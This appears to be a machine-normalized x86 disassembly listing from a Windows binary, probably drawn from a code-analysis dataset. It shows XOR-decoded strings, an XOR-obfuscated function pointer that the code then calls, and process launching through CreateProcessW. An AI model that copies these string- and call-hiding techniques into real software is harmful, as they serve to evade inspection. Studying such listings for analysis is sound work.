lea edx [ ebp - 0x34 ]
mov eax 0x22
call sub_1002f620
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
push 0x5c
push ebx
call sub_1006807b
add esp 0x8
lea ebx [ eax + 0x2 ]
push 0x208
lea eax [ ebp - 0x250 ]
push 0x0
push eax
call sub_1007f8f0
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov esi [ edx + 0x14 ]
push 0x2e
push esi
call sub_1006807b
mov edi eax
add esp 0x14
test edi edi
je r-xdata
xor eax eax
mov edi edi
lea edx [ ebp - 0x48 ]
mov eax 0x13
call sub_1002f620
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
sub eax esi
sar eax 0x1
add eax eax
push eax
lea ecx [ ebp - 0x250 ]
push esi
push ecx
call sub_1007f580
mov ecx [ r--data ]
add esp 0xc
xor eax eax
lea ecx [ ecx ]
inc eax
cmp eax 0x18
jb r-xdata
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x57
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x2
jb r-xdata
mov esi [ lstrcatW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x250 ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call esi
push edi
lea eax [ ebp - 0x250 ]
push eax
call esi
push ebx
lea ecx [ ebp - 0x250 ]
push ecx
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x254 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x254 ] eax
test eax eax
jne r-xdata
mov edx [ ebp - 0x254 ]
mov eax [ edx ]
mov ecx [ ebp - 0x258 ]
mov edx [ ecx ]
mov [ edx + 0x50 ] eax
inc [ eax + 0x1c ]
mov ecx [ ebp - 0x254 ]
mov edx [ ecx ]
mov ebx [ edx + 0x4 ]
push 0x5c
push ebx
call sub_1006807b
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10043e00
push ebp
mov ebp esp
push 0xffffffff
push sub_100866df
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
xor edi edi
push 0x4
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x14 ] eax
push edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call [ GetProcessHeap@IAT ]
mov ebx [ HeapAlloc@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] edi
push edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ ebx ]
jne r-xdata
mov edx [ ecx + 0x4 ]
dec [ edx ]
cmp [ edx ] edi
jne r-xdata
mov [ esi + 0x3c ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_1002d4a0
mov ecx [ ebp + 0x20 ]
mov eax [ ecx ]
mov ebx [ ecx + 0x4 ]
inc [ ebx ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ebx
lea edx [ ebp - 0x18 ]
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] 0x5
cmp ecx edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp eax edi
je r-xdata
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] ebx
inc [ ebx ]
mov ecx [ ecx ]
mov [ ebp + 0x1c ] ecx
cmp ecx edi
je r-xdata
push ebx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
call sub_10054bf0
mov ecx [ ebp - 0x18 ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ esi + 0x1c ]
cmp ecx edi
je r-xdata
mov eax ecx
call sub_10054bf0
mov eax [ ebp + 0x1c ]
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x18 ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x18 ]
sub_10043fb5
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10044040
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0x4 ]
push edi
mov edi [ ebp + 0x8 ]
push eax
push edi
call sub_1006db40
mov ecx [ esi + 0x10 ]
push ecx
push edi
call sub_1006db40
push esi
push edi
call sub_1006db40
add esp 0x18
pop edi
pop esi
pop ebp
retn
sub_10044070
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x3fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x2
cmp eax ecx
jae r-xdata
push r--data
call sub_10030594
pop ebp
retn 0x4
push ebx
push edi
call sub_10054c60
mov ecx [ esi + 0x4 ]
mov ebx eax
mov eax [ esi ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push ebx
call sub_1007ec40
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0xc
sar edi 0x2
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ebx + edi * 4 ]
lea eax [ ebx + edx * 4 ]
pop edi
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ecx
pop ebx
push eax
call sub_1000a86e
add esp 0x4
sub_100440f0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10088aac
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x198 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1b0 ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x8 ] 0x0
mov [ esp + 0x24 ] esi
jne r-xdata
mov ecx [ esi + 0x3c ]
add ecx [ esi + 0x80 ]
lea eax [ ecx + ecx + 0x4 ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp [ esi + 0x84 ] 0x8
mov ebx eax
jb r-xdata
mov eax 0x1
jmp r-xdata
lea edx [ esi + 0x70 ]
mov edx [ esi + 0x70 ]
jmp r-xdata
mov ecx [ esp + 0x1b0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x198 ]
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax 0x2
jmp r-xdata
cmp eax 0x7fffffff
ja r-xdata
mov eax [ esi + 0x80 ]
mov ecx [ esi + 0x3c ]
lea eax [ ecx + eax + 0x2 ]
test eax eax
je r-xdata
push edx
mov edx 0x7ffffffe
mov ecx ebx
call sub_10072780
test eax eax
jns r-xdata
mov eax [ esi + 0x80 ]
mov ecx [ esi + 0x3c ]
lea edx [ ecx + eax + 0x2 ]
lea edi [ esp + 0x18 ]
mov ecx ebx
mov [ esp + 0x14 ] edx
call sub_10072720
test eax eax
js r-xdata
mov eax 0x3
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
sub eax ecx
push r--data
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072780
test eax eax
jns r-xdata
cmp [ esi + 0x40 ] 0x8
lea eax [ esi + 0x2c ]
mov [ esp + 0x1c ] eax
jb r-xdata
mov [ esp + 0x14 ] eax
mov ecx [ eax ]
mov [ esp + 0x14 ] ecx
jmp r-xdata
mov eax 0x4
jmp r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x28 ]
mov eax [ esp + 0x18 ]
push edx
sub eax ecx
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072780
test eax eax
jns r-xdata
mov eax [ esi + 0x80 ]
mov ecx [ esi + 0x3c ]
lea edx [ ecx + eax + 0x2 ]
lea edi [ esp + 0x28 ]
mov ecx ebx
mov [ esp + 0x18 ] edx
call sub_10072720
test eax eax
js r-xdata
push 0x44
lea eax [ esp + 0x40 ]
push 0x0
push eax
call sub_1007f8f0
add esp 0xc
xor eax eax
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0x40 ]
push edx
push eax
push eax
push eax
push eax
push eax
push eax
push ebx
push eax
mov [ esp + 0x64 ] 0x44
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] eax
mov [ esp + 0x5c ] eax
mov [ esp + 0x60 ] eax
call [ CreateProcessW@IAT ]
test eax eax
jne r-xdata
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ esp + 0xf4 ]
mov eax 0x4f
call sub_10069020
lea edx [ esp + 0x118 ]
mov eax 0x1b
call sub_10069020
push edx
lea eax [ esp + 0xa4 ]
lea ebx [ esi + 0xc ]
push eax
call sub_10029ef0
push eax
lea edx [ esp + 0x100 ]
lea esi [ esp + 0xe4 ]
mov [ esp + 0x1c4 ] 0x1
call sub_100519f0
add esp 0xc
mov ecx eax
mov eax [ esp + 0x1c ]
lea esi [ esp + 0xbc ]
mov [ esp + 0x1b8 ] 0x2
call sub_1006acf0
mov edx eax
mov ecx 0x5
mov [ esp + 0x1b8 ] 0x3
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ esp + 0xd8 ]
call sub_100702e0
lea ecx [ esp + 0xa0 ]
call sub_100702e0
mov eax [ esp + 0x2c ]
mov esi [ esp + 0x24 ]
push 0xffffffff
push eax
mov [ esi + 0x4c ] eax
call [ WaitForSingleObject@IAT ]
mov edx [ esi + 0x4c ]
lea ecx [ esp + 0x20 ]
push ecx
push edx
call [ GetExitCodeProcess@IAT ]
mov eax [ esp + 0x20 ]
mov [ esi + 0x50 ] eax
xor eax eax
lea edx [ esp + 0x154 ]
mov eax 0x9e
call sub_10069020
mov eax edx
push eax
lea ecx [ esp + 0x88 ]
lea ebx [ esi + 0xc ]
push ecx
call sub_10029ef0
add esp 0x8
mov edx eax
mov ecx 0x5
mov [ esp + 0x1b8 ] 0x0
call sub_10022b50
lea ecx [ esp + 0x84 ]
call sub_100702e0
mov eax 0x5
jmp r-xdata
sub_10044400
push ebp
mov ebp esp
push 0xffffffff
push sub_10086230
mov eax [ fs : 0x0 ]
push eax
sub esp 0x74
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ VariantInit@IAT ]
lea eax [ ebp - 0x70 ]
push eax
call esi
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x64 ]
mov edi [ ebp - 0x70 ]
mov ebx [ ebp - 0x6c ]
lea eax [ ebp - 0x60 ]
push eax
mov [ ebp - 0x78 ] ecx
mov [ ebp - 0x74 ] edx
call esi
mov edx [ ebp - 0x5c ]
mov ecx [ ebp - 0x60 ]
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x20 ] ecx
mov ecx [ ebp - 0x54 ]
lea edx [ ebp - 0x50 ]
push edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
call esi
mov ecx [ ebp - 0x4c ]
mov eax [ ebp - 0x50 ]
mov edx [ ebp - 0x48 ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x44 ]
lea ecx [ ebp - 0x40 ]
push ecx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] eax
call esi
mov [ ebp - 0x4 ] 0x3
mov esi [ ebp - 0x78 ]
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x74 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x20 ]
mov edx [ ebp + 0xc ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x1c ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x18 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x14 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x30 ]
mov ecx [ edx ]
mov edx [ ecx ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x2c ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x28 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x24 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x40 ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x3c ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x38 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x34 ]
mov [ eax + 0xc ] esi
mov eax [ edx + 0x28 ]
push ecx
call eax
mov ecx [ ebp + 0x8 ]
mov esi [ VariantClear@IAT ]
lea edx [ ebp - 0x40 ]
push edx
mov [ ecx ] eax
call esi
lea eax [ ebp - 0x50 ]
push eax
call esi
lea ecx [ ebp - 0x60 ]
push ecx
call esi
lea edx [ ebp - 0x70 ]
push edx
call esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10044540
push ebp
mov ebp esp
sub esp 0x14
mov edx [ rw-data ]
mov ecx [ ebp + 0xc ]
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov al 0x38
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x4 ] ecx
call [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn 0x8
sub_100445b0
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
cmp eax 0x1ffffffe
jb r-xdata
inc eax
push ebx
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ edi + 0x4 ] eax
mov edx [ ecx + 0x4 ]
xor bl bl
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x14 ]
push eax
call sub_1000a86e
add esp 0x4
push r--data
call sub_10030594
cmp [ ebp + 0xc ] bl
je r-xdata
mov [ edx + 0x4 ] edi
mov edx [ ecx + 0x4 ]
mov [ edx ] edi
mov eax [ ecx + 0x4 ]
mov [ eax + 0x8 ] edi
jmp r-xdata
mov [ eax + 0x8 ] edi
mov edx [ ecx + 0x4 ]
cmp eax [ edx + 0x8 ]
jne r-xdata
mov [ eax ] edi
mov edx [ ecx + 0x4 ]
cmp eax [ edx ]
jne r-xdata
mov edx [ edi + 0x4 ]
mov eax edi
cmp [ edx + 0x14 ] bl
jne r-xdata
mov [ edx + 0x8 ] edi
mov [ edx ] edi
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
mov [ ecx + 0x14 ] 0x1
pop ebx
pop ebp
retn 0x10
push esi
lea ebx [ ebx ]
mov esi [ esi ]
cmp [ esi + 0x14 ] bl
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x14 ] bl
jne r-xdata
cmp eax [ edx ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp eax [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x4 ]
jmp r-xdata
mov edx [ eax + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x15 ] bl
jne r-xdata
mov eax edx
mov edx [ eax ]
mov esi [ edx + 0x8 ]
mov [ eax ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x15 ] bl
jne r-xdata
mov edx [ eax + 0x4 ]
cmp [ edx + 0x14 ] bl
je r-xdata
mov edx [ eax + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] bl
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x15 ] bl
jne r-xdata
mov eax edx
mov edx [ eax + 0x8 ]
mov esi [ edx ]
mov [ eax + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x15 ] bl
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ecx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ eax + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ecx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] eax
mov edx [ eax + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
pop esi
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ecx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ eax + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ecx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] eax
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp eax [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ eax + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] eax
mov [ eax + 0x4 ] edx
sub_100447e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084ffb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x20
mov [ ebp - 0x10 ] 0x0
call sub_1002e3ac
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov ecx eax
call sub_10054ae0
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] eax
test edi edi
je r-xdata
mov eax [ rw-data ]
mov ecx [ esi ]
push eax
push edi
push ecx
call sub_1006a134
mov edx [ esi ]
mov [ edx + 0x10 ] 0x0
mov ecx [ esi ]
add esp 0xc
push r--data
add ecx 0x18
call sub_10024880
push 0x0
lea ecx [ ebp + 0x8 ]
call sub_1000c927
cmp [ rw-data ] 0x0
jne r-xdata
lea ecx [ ebp + 0x8 ]
call sub_10003c9c
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
sub_100448ba
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_1006e175
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_1002f5d0
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_100302aa
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_10038b73
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push [ ebp - 0xc ]
push 0x0
call sub_10030370
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_100449d0
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax [ ecx + 0x10 ]
cmp eax esi
jae r-xdata
mov edx esi
cmp esi edi
jb r-xdata
mov esi eax
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov edx edi
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
cmp esi edi
jae r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
test edx edx
je r-xdata
xor eax eax
cmp esi edi
setne al
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x4
mov bx [ eax ]
cmp bx [ ecx ]
jne r-xdata
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jne r-xdata
add eax 0x2
add ecx 0x2
dec edx
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
jmp r-xdata
sub_10044a40
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov eax ebx
push edi
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ecx + 0x10 ]
sub eax edx
mov edi eax
mov eax esi
cmp esi edi
jb r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax edi
push eax
push ebx
push ecx
call sub_100021f0
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ecx ]
pop edi
xor ecx ecx
test eax eax
pop esi
sete al
pop ebx
pop ebp
retn
cmp esi edi
jae r-xdata
xor eax eax
cmp esi edi
setne al
or eax 0xffffffff
pop edi
xor ecx ecx
test eax eax
pop esi
sete al
pop ebx
pop ebp
retn
sub_10044ab0
push ebp
mov ebp esp
mov edx [ rw-data ]
mov eax [ edx + 0x10 ]
push esi
mov esi [ edx + 0xc ]
cmp esi eax
je r-xdata
or eax 0xffffffff
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
cmp esi eax
jne r-xdata
add esi 0x8
cmp esi eax
jne r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
cmp ecx eax
ja r-xdata
cmp [ esi ] ecx
je r-xdata
push ebx
push edi
mov edi [ ebp + 0x10 ]
lea ebx [ ecx + edi ]
cmp ebx eax
jb r-xdata
mov eax [ edx ]
add eax ecx
mov ecx [ ebp + 0xc ]
push edi
push eax
push ecx
call sub_1007f580
add esp 0xc
add [ esi + 0x4 ] edi
mov eax edi
pop edi
pop ebx
pop esi
pop ebp
retn
sub eax ecx
mov edi eax
sub_10044b20
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff87
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x34
and edx 0xff
mov [ ebp + eax * 2 - 0x34 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x24 ] ax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x5f
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0x7
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x20 ]
xor eax eax
push ecx
mov [ ebp - 0x12 ] ax
call esi
lea edx [ ebp - 0x34 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
